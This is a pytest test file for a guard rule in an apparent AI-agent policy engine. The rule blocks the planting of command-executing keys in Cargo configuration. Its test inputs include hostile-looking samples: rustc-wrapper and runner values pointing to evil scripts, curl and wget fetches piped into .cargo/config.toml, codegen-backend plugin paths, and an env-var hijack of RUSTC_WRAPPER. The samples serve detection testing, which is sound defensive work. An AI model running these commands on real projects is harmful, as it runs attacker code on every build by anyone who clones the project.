"""Cargo exec-hijack protection guard — blocks planting a command-executing
key in Cargo's config (``.cargo/config.toml``, legacy ``.cargo/config``,
``$CARGO_HOME/config.toml``): ``build.rustc-wrapper``/``rustc-workspace-
wrapper``/``rustc``/``rustdoc``, ``target.<triple>.runner``/``linker``,
``credential-provider``, plus the ``CARGO_*``/``RUSTC_WRAPPER`` env-var and
``cargo --config`` spellings.

THREAT MODEL: Cargo spawns those values on the next build/run/test (and on
rust-analyzer's background check), by anyone who builds the project.
``rule_package_manifest_protect`` gates the same file for registry redirects
only. File writes are path+content gated; env/CLI forms are unconditional.
"""
from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})

RULE = "cargo-exec-protect"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content=None, tool="Write"):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args=args)


def _edit(path, new, old=None):
    args = {"file_path": path, "new_string": new}
    if old is not None:
        args["old_string"] = old
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args=args)


def _hit(ev, policy=EMPTY):
    d = evaluate(ev, policy)
    return d.rule == RULE, d


# ---- file writes: hits ---------------------------------------------------------
def test_write_rustc_wrapper_gated():
    ok, d = _hit(_write(".cargo/config.toml", '[build]\nrustc-wrapper = "/tmp/x.sh"\n'))
    assert ok and d.action == Action.ASK


def test_write_runner_gated():
    ok, _ = _hit(_write(".cargo/config.toml",
                        '[target.x86_64-unknown-linux-gnu]\nrunner = "sh -c evil"\n'))
    assert ok


def test_write_linker_gated():
    ok, _ = _hit(_write(".cargo/config", '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/l"\n'))
    assert ok


def test_write_credential_provider_gated():
    ok, _ = _hit(_write(".cargo/config.toml",
                        '[registry]\nglobal-credential-providers = ["cargo:token-from-stdout curl x"]\n'))
    assert ok


def test_write_rustflags_linker_gated():
    ok, _ = _hit(_write(".cargo/config.toml", '[build]\nrustflags = ["-C", "linker=/tmp/l"]\n'))
    assert ok
    ok, _ = _hit(_write(".cargo/config.toml", '[build]\nrustflags = ["-Clink-arg=-fuse-ld=/tmp/l"]\n'))
    assert ok


def test_quoted_and_dotted_keys_gated():
    ok, _ = _hit(_write(".cargo/config.toml", 'build.rustc-wrapper = "/tmp/x"\n'))
    assert ok
    ok, _ = _hit(_write(".cargo/config.toml", '[build]\n"rustc-wrapper" = "/tmp/x"\n'))
    assert ok


def test_cargo_home_and_windows_paths_gated():
    content = '[build]\nrustc-wrapper = "x"\n'
    assert _hit(_write("/home/u/.cargo/config.toml", content))[0]
    assert _hit(_write("C:\\Users\\u\\.cargo\\config.toml", content))[0]
    assert _hit(_write("proj/.cargo/../.cargo/config.toml", content))[0]


def test_edit_old_string_context_counts():
    ok, _ = _hit(_edit(".cargo/config.toml", "= \"y\"", old='rustc-wrapper = "x"'))
    assert ok


def test_edit_new_string_hit():
    assert _hit(_edit(".cargo/config.toml", 'runner = "evil"'))[0]


def test_mcp_write_structural_args_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file",
                    args={"path": ".cargo/config.toml", "text": 'rustc-wrapper = "x"'})
    assert _hit(ev)[0]


def test_deny_mode_denies():
    ok, d = _hit(_write(".cargo/config.toml", 'rustc-wrapper = "x"'), DENY)
    assert ok and d.action == Action.DENY


# ---- file writes: no hit -------------------------------------------------------
def test_benign_config_content_not_gated():
    for c in ('[net]\nretry = 3\n', '[alias]\nb = "build"\n', '[profile.release]\nlto = true\n',
              '[build]\njobs = 4\nrustflags = ["-C", "target-cpu=native"]\n',
              '[env]\nFOO = "bar"\n'):
        assert not _hit(_write(".cargo/config.toml", c))[0], c


def test_exec_key_in_unrelated_file_not_gated():
    assert not _hit(_write("Cargo.toml", '[package]\nrunner = "x"\n'))[0]
    assert not _hit(_write("notes/config.toml", 'linker = "x"\n'))[0]
    assert not _hit(_write("src/main.rs", 'let linker = 1;'))[0]


def test_word_boundaries_not_gated():
    # `mylinker =`/`my-runner =` are not the cargo keys
    assert not _hit(_write(".cargo/config.toml", 'mylinker = "x"\nmy-runner = "y"\n'))[0]


# ---- shell: file hits ----------------------------------------------------------
def test_shell_heredoc_redirect_gated():
    assert _hit(_shell("cat > .cargo/config.toml <<EOF\n[build]\nrustc-wrapper = \"x\"\nEOF"))[0]


def test_shell_echo_append_gated():
    assert _hit(_shell("echo 'runner = \"evil\"' >> ~/.cargo/config.toml"))[0]


def test_shell_sed_inplace_gated():
    assert _hit(_shell("sed -i 's/^\\[build\\]/[build]\\nrustc-wrapper=\"x\"/' .cargo/config.toml"))[0]


def test_shell_tee_gated():
    assert _hit(_shell("printf 'linker=\"/x\"' | tee -a .cargo/config.toml"))[0]


def test_shell_cargo_home_gated():
    assert _hit(_shell("echo 'runner=\"x\"' >> $CARGO_HOME/config.toml"))[0]
    assert _hit(_shell("echo 'runner=\"x\"' >> ${CARGO_HOME}/config.toml"))[0]


def test_shell_cd_then_bare_filename_gated():
    assert _hit(_shell("cd .cargo && echo 'rustc-wrapper=\"x\"' > config.toml"))[0]


def test_shell_opaque_copy_move_link_gated():
    for c in ("cp /tmp/evil.toml .cargo/config.toml", "mv evil.toml .cargo/config.toml",
              "ln -sf /tmp/evil.toml .cargo/config.toml", "install -m 644 e .cargo/config"):
        assert _hit(_shell(c))[0], c


def test_shell_benign_writes_not_gated():
    for c in ("echo '[net]' >> .cargo/config.toml", "cat .cargo/config.toml",
              "rm .cargo/config.toml", "cargo build", "grep runner .cargo/config.toml"):
        assert not _hit(_shell(c))[0], c


# ---- shell: env / --config ----------------------------------------------------
def test_env_forms_gated():
    for c in ("export RUSTC_WRAPPER=/tmp/x", "RUSTC_WRAPPER=/tmp/x cargo build",
              "CARGO_BUILD_RUSTC_WRAPPER=/tmp/x cargo check",
              "export CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER='sh -c x'",
              "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_LINKER=/tmp/l cargo build",
              "CARGO_REGISTRIES_FOO_CREDENTIAL_PROVIDER='cargo:token-from-stdout x' cargo publish",
              "export RUSTC=/tmp/fake-rustc", "env RUSTC_WORKSPACE_WRAPPER=/x cargo test",
              "$env:RUSTC_WRAPPER = 'C:\\x.exe'", "setx RUSTC_WRAPPER C:\\x.exe",
              "Set-Item Env:RUSTC_WRAPPER C:\\x.exe",
              "[Environment]::SetEnvironmentVariable('RUSTC_WRAPPER','C:\\x.exe','User')",
              "launchctl setenv RUSTC_WRAPPER /tmp/x",
              "RUSTDOCFLAGS='--runtool /tmp/x' cargo doc"):
        assert _hit(_shell(c))[0], c


def test_env_clearing_and_reads_not_gated():
    for c in ("RUSTC_WRAPPER= cargo build", 'RUSTC_WRAPPER="" cargo build',
              "echo $RUSTC_WRAPPER", "unset RUSTC_WRAPPER", "MYRUSTC=x cargo build"):
        assert not _hit(_shell(c))[0], c


def test_cli_config_flag_gated():
    for c in ("cargo build --config 'build.rustc-wrapper=\"/x\"'",
              "cargo run --config target.x86_64-unknown-linux-gnu.runner=\"sh\"",
              "cargo run --config \"target.'cfg(unix)'.runner='evil'\"",
              "cargo publish --config 'registry.global-credential-providers=[\"cargo:token-from-stdout x\"]'",
              "cargo build --config=build.rustc=\"/x\""):
        assert _hit(_shell(c))[0], c


def test_cli_config_benign_not_gated():
    assert not _hit(_shell("cargo build --config 'net.retry=5'"))[0]
    assert not _hit(_shell("cargo build --config profile.release.lto=true"))[0]


# ---- escapes / modes -----------------------------------------------------------
def test_env_toggle_escapes(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert not _hit(_write(".cargo/config.toml", 'rustc-wrapper = "sccache"'))[0]
    assert not _hit(_shell("export RUSTC_WRAPPER=sccache"))[0]


def test_human_aegis_allow_escapes_shell():
    assert not _hit(_shell("export RUSTC_WRAPPER=sccache  # aegis-allow"))[0]


def test_policy_allow_list_escapes():
    p = Policy(cargo_exec={"allow": [r"sccache"]})
    assert not _hit(_shell("export RUSTC_WRAPPER=sccache"), p)[0]
    assert _hit(_shell("export RUSTC_WRAPPER=/tmp/evil"), p)[0]


def test_mode_off_and_monitor():
    off = Policy(cargo_exec={"mode": "off"})
    assert not _hit(_shell("export RUSTC_WRAPPER=/x"), off)[0]
    mon = Policy(cargo_exec={"mode": "monitor"})
    assert not _hit(_shell("export RUSTC_WRAPPER=/x"), mon)[0]


def test_policy_loads_cargo_exec_from_yaml(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("cargo_exec:\n  mode: deny\n")
    assert load_policy(f).cargo_exec == {"mode": "deny"}


def test_rule_registered_in_builtins():
    from aegis.rules import BUILTIN_RULES, rule_cargo_exec_protect
    assert rule_cargo_exec_protect in BUILTIN_RULES


# ---- QA round 1 fixes ----------------------------------------------------------
def test_fetch_redirect_into_config_gated():
    for c in ("curl -sSL https://e.example/x > .cargo/config.toml",
              "wget -qO- https://e.example/x | tee .cargo/config.toml",
              "curl -s https://e.example/x >> ~/.cargo/config"):
        assert evaluate(_shell(c), EMPTY).action != Action.ALLOW, c


def test_config_as_source_not_gated():
    for c in ("cp .cargo/config.toml /tmp/backup.toml",
              "mv .cargo/config.toml .cargo/config.toml.bak"):
        assert not _hit(_shell(c))[0], c


def test_write_branch_allow_list_and_deny_shell():
    p = Policy(cargo_exec={"allow": [r"\.cargo/config\.toml"]})
    assert not _hit(_write(".cargo/config.toml", 'rustc-wrapper = "x"'), p)[0]
    ok, d = _hit(_shell("export RUSTC_WRAPPER=/x"), DENY)
    assert ok and d.action == Action.DENY


def test_mode_false_is_off():
    assert not _hit(_shell("export RUSTC_WRAPPER=/x"), Policy(cargo_exec={"mode": False}))[0]


# ---- QA round 2 fixes ----------------------------------------------------------
def test_rustdoc_runtool_and_codegen_backend_gated():
    assert _hit(_write(".cargo/config.toml", '[build]\nrustdocflags=["--runtool","x"]\n'))[0]
    assert _hit(_write(".cargo/config.toml", '[build]\nrustdocflags=["--test-runtool=x"]\n'))[0]
    assert _hit(_shell("echo 'rustflags = [\"-Zcodegen-backend=/tmp/x.so\"]' >> .cargo/config.toml"))[0]
    assert _hit(_write(".cargo/config.toml", '[build]\nrustflags=["-Zllvm-plugins=/x.so"]\n'))[0]


def test_include_key_and_config_file_gated():
    assert _hit(_write(".cargo/config.toml", 'include = ["/tmp/evil.toml"]\n'))[0]
    assert _hit(_shell("cargo build --config /tmp/evil.toml"))[0]
    assert _hit(_shell("cargo build --config 'include=\"/tmp/evil.toml\"'"))[0]
    assert _hit(_shell("cargo build --config evil.toml"))[0]


def test_cargo_config_set_gated():
    assert _hit(_shell("cargo config set build.rustc-wrapper x"))[0]
    assert _hit(_shell("cargo -Zunstable-options config set target.x86_64-unknown-linux-gnu.runner x"))[0]


def test_mcp_push_files_nested_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__github__push_files",
                    args={"files": [{"path": "README.md", "content": "hi"},
                                    {"path": ".cargo/config.toml",
                                     "content": '[build]\nrustc-wrapper="x"\n'}]})
    assert _hit(ev)[0]
    ok = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__github__push_files",
                    args={"files": [{"path": ".cargo/config.toml", "content": "[net]\nretry=3\n"}]})
    assert not _hit(ok)[0]


def test_opaque_source_writes_gated():
    for c in ("cat /tmp/c > .cargo/config.toml", "cat /tmp/c | tee .cargo/config.toml",
              "tee .cargo/config.toml < /tmp/c", "echo x | sponge .cargo/config.toml",
              "rsync /tmp/e.toml .cargo/config.toml", "cp /tmp/config.toml .cargo/",
              "cp -t .cargo /tmp/config.toml"):
        assert evaluate(_shell(c), EMPTY).action != Action.ALLOW, c
        assert _hit(_shell(c))[0], c


def test_lowercase_env_prose_not_gated():
    for c in ('echo "msrv rustc=1.75" > notes.txt', "rustc=$(which rustc); echo $rustc",
              "git commit -m 'set rustc = fast'", "echo 'rustc=1' > settings/config.toml"):
        assert not _hit(_shell(c))[0], c


def test_comments_and_empty_values_not_gated():
    for c in ('# rustc-wrapper = sccache is not used\n[net]\n', "[build]\nrustc-wrapper=''\n",
              '[build]\nrunner = ""\n', "[build]\nrustflags = []\n"):
        assert not _hit(_write(".cargo/config.toml", c))[0], c


def test_monitor_mode_records_row(monkeypatch):
    import aegis.rules as R
    seen = []
    monkeypatch.setattr(R, "_record_monitor", lambda ev, would, note="": seen.append(note))
    assert not _hit(_shell("export RUSTC_WRAPPER=/x"), Policy(cargo_exec={"mode": "monitor"}))[0]
    assert seen == ["cargo-exec-protect-monitor"]
